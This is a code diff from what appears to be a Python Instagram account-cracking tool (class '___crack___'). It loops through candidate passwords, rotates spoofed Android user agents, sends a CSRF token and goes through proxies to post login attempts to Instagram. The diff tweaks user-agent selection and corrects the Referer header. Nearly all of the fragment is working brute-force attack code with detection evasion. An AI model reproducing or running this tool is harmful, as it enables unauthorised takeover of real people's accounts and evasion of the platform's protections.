@@ -418,7 +418,7 @@ class ___crack___:
             ___ua7 = ('Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
             ___ua8 = ('Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
             ___ua9 = ('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
-            ___roz = requests.get(open('Data/ua2.txt','r').read().splitlines())   
+            ___roz = requests.get(random.choice(open('Data/ua2.txt','r').read().splitlines()))   
         try:
             for pw in pwx:
                 pw = pw.lower()
@@ -432,7 +432,7 @@ class ___crack___:
                 'optIntoOneTap': 'false'}
                 ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://z-p15.www.instagram.com/accounts/login/',
+                'Referer': 'https://www.instagram.com/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
